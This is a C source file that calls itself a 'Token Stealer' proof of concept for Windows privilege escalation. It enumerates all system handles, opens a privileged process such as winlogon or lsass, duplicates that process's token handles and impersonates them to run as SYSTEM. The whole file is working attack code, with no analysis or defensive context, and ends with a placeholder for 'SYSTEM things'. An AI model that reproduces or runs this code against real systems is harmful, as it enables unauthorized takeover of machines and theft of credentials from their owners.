#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

// Fox's Data-Only Token Stealer
int main() {
    ULONG returnLength = 0;
    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, NULL, 0, &returnLength);
    
    PVOID buffer = malloc(returnLength + 0x1000);
    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, returnLength + 0x1000, &returnLength);
    
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to query system handles.\n");
        return -1;
    }

    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
    printf("[+] Found %lu handles system-wide.\n", handleInfo->NumberOfHandles);

    // Target a known privileged PID (e.g., winlogon.exe). Hardcoded for PoC.
    DWORD targetPid = 432; // Replace with actual winlogon/lsass PID
    HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, targetPid);
    
    if (!hProcess) {
        printf("[-] Could not open target process for handle duplication.\n");
        return -1;
    }

    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = handleInfo->Handles[i];
        
        if (handle.UniqueProcessId == targetPid) {
            HANDLE hDup = NULL;
            // Duplicate the handle into our process
            if (DuplicateHandle(hProcess, (HANDLE)handle.HandleValue, GetCurrentProcess(), &hDup, TOKEN_IMPERSONATE | TOKEN_QUERY, FALSE, 0)) {
                
                // Try to impersonate. If it's a valid SYSTEM token, this succeeds.
                if (ImpersonateLoggedOnUser(hDup)) {
                    printf("[!] Holy shit. Successfully impersonated token from handle 0x%X!\n", handle.HandleValue);
                    printf("[!] We are now running as SYSTEM. No shellcode required.\n");
                    
                    // Do SYSTEM things here...
                    
                    RevertToSelf();
                    CloseHandle(hDup);
                    break;
                }
                CloseHandle(hDup);
            }
        }
    }

    CloseHandle(hProcess);
    free(buffer);
    return 0;
}